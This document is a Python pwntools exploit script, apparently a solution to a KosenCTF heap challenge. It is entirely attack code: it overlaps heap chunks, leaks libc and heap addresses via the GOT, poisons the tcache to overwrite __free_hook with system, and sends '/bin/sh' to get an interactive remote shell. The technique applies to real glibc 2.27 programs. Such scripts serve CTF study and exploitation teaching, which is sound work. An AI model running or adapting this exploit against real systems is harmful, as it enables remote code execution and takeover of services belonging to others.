from pwn import *
import sys

#import kmpwn
sys.path.append('/home/vagrant/kmpwn')
from kmpwn import *
#fsb(width, offset, data, padding, roop)

#config
context(os='linux', arch='i386')
context.log_level = 'debug'

FILE_NAME = "./chall"
#"""
HOST = "pwn.kosenctf.com"
PORT = 9005
"""
HOST = "localhost"
PORT = 7777
#"""

if len(sys.argv) > 1 and sys.argv[1] == 'r':
	conn = remote(HOST, PORT)
else:
	conn = process(FILE_NAME)

elf = ELF(FILE_NAME)
got_puts = elf.got["puts"] # 0x602020
addr_list = 0x6020a0

libc = ELF('./libc-2.27.so')
off_system = libc.symbols["system"]
off_puts = libc.symbols["puts"]
off_free_hook = libc.symbols["__free_hook"]

def set_str(index, data):
	conn.sendlineafter("> ", "1")	
	conn.sendlineafter(": ", str(index))	
	conn.sendlineafter(": ", "1")
	conn.sendafter(": ", data)

def set_double(index, data):
	conn.sendlineafter("> ", "1")	
	conn.sendlineafter(": ", str(index))	
	conn.sendlineafter(": ", "2")
	conn.sendlineafter(": ", data)

def set_int(index, data):
	conn.sendlineafter("> ", "1")	
	conn.sendlineafter(": ", str(index))	
	conn.sendlineafter(": ", "3")
	conn.sendlineafter(": ", str(data))

def show():
	conn.sendlineafter("> ", "2")

def delete(index):
	conn.sendlineafter("> ", "3")
	conn.sendlineafter(": ", str(index))

def exploit():
	payload = "A"*0x40
	payload += p64(0)
	payload += p64(0x81)
	payload += "\n"
	set_str(0, payload)
	set_double(1, "3.1124555e-317") # got_puts
	set_double(2, "3.1125187e-317") # addr_list
	
	payload = "B"*0x40
	payload += p64(0)
	payload += p64(0x81)
	payload += "\n"
	set_str(3, payload) # over lapped
	set_str(4, "C"*0x40+"\n") # prevent consolidate
	
	show()

	conn.recvuntil("1: [string] \"")
	
	libc_puts = u64(conn.recv(6)+"\x00\x00")
	libc_base = libc_puts - off_puts
	libc_system = libc_base + off_system
	libc_free_hook = libc_base + off_free_hook
	
	conn.recvuntil("2: [string] \"")
	heap_base = conn.recvuntil("\"")[:-1]
	heap_base += "\x00"*(8-len(heap_base))
	heap_base = u64(heap_base) - 0x260
	
	delete(3)
	fake_chk = heap_base+0x2b0
	fake_f = str(struct.unpack("d", struct.pack("Q", fake_chk)))
	fake_f = fake_f[1:]  # eliminate "("
	fake_f = fake_f[:-2] # eliminate ",)"
	#fake_f += "\x00"*0x80
	set_double(5, fake_f)  
	delete(5)
	payload = p64(0)*5
	payload += p64(0x81)
	payload += p64(libc_free_hook-8)
	payload += "\n"
	set_str(5, payload)
	set_str(6, "pokemon\n")
	conn.sendlineafter("> ", "/bin/sh\x00"+p64(libc_system))

	print hex(libc_base)	
	print hex(heap_base)	

	conn.interactive()	

if __name__ == "__main__":
	exploit()	
